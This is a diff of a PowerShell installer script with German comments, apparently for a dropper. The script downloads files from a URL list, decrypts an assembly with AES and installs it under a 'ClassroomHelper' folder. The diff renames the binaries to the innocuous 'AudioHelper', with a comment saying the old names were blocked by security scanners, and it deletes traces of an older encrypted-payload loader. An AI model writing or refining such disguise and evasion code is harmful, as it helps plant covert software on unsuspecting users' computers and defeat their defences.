@@ -5,9 +5,19 @@ $ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
 
 $dest = Join-Path $env:LOCALAPPDATA 'ClassroomHelper'
-$exe = Join-Path $dest 'ClassroomHelper.exe'
-$dll = Join-Path $dest 'ClassroomHelper.dll'
+$exe = Join-Path $dest 'AudioHelper.exe'
+$dll = Join-Path $dest 'AudioHelper.dll'
 $done = Join-Path $dest '.complete'
+
+# Alte Namen aus frueheren Builds. ClassroomHelper.exe/.dll und WindowsAudioHost.exe
+# werden von Scannern beim Schreiben blockiert, also liegen sie hier nur noch
+# als Leiche herum.
+foreach ($old in @('ClassroomHelper.exe', 'WindowsAudioHost.exe', 'ClassroomHelper.dll')) {
+    $p = Join-Path $dest $old
+    if (Test-Path -LiteralPath $p) {
+        try { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue } catch { }
+    }
+}
 
 # Reste einer alten Testversion. Die lag unter C:\audiohost, weil der erste
 # Build noch $env:SystemDrive benutzt hat. Best effort: wenn ein anderes Konto
@@ -44,10 +54,6 @@ foreach ($u in $urls) {
 if (-not $got) { throw 'download failed' }
 
 New-Item -ItemType Directory -Path $dest -Force | Out-Null
-
-# Reste der Loader-Version: die hatte eine zweite, verschluesselte Kopie der
-# Assembly als payload.bin daneben. Wird nicht mehr geladen, also weg damit.
-Remove-Item -LiteralPath (Join-Path $dest 'payload.bin') -Force -ErrorAction SilentlyContinue
 
 $aes = [System.Security.Cryptography.Aes]::Create()
 $aes.Mode = 'CBC'
